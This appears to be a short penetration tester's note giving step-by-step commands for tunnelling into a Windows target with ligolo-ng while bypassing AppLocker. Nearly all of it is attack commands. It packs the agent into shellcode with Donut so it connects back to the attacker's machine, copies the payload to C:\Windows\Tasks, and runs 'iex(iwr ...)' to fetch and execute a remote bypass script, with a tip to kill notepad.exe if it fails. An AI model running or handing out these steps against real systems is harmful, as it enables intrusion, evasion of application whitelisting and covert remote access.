
Set up ligolo proxy first: [[Ligolo-ng#Install]]

```
sudo wget https://raw.githubusercontent.com/Extravenger/OSEPlayground/refs/heads/main/04%20-%20Tunneling/Ligolo-ApplockerBypass/Ligolo-ApplockerBypass.ps1 -O /var/www/html/Ligolo-ApplockerBypass.ps1
```


```
git clone https://github.com/nicocha30/ligolo-ng
```

```
cp ligolo-ng/ligolo-agent.exe donut/
```

[[Donut]]

```
./donut -f 1 -o agent.bin -a 2 -p "-connect $KALI:11601 -ignore-cert" -i ligolo-agent.exe
```

`agent.bin`

```
sudo cp agent.bin /var/www/html
```

Copy this agent.bin to target C:\Windows\Tasks
```
iwr http://$KALI/agent.bin -OutFile C:\Windows\Tasks\agent.bin
```

Then run:
```
iex(iwr http://$KALI/Ligolo-ApplockerBypass.ps1 -UseBasicParsing)
```

If no success in the first time, make sure to kill the notepad.exe process with:
```
taskkill /IM:notepad.exe /F
```

before trying again.

```
session
```

```
1
```

```
start
```
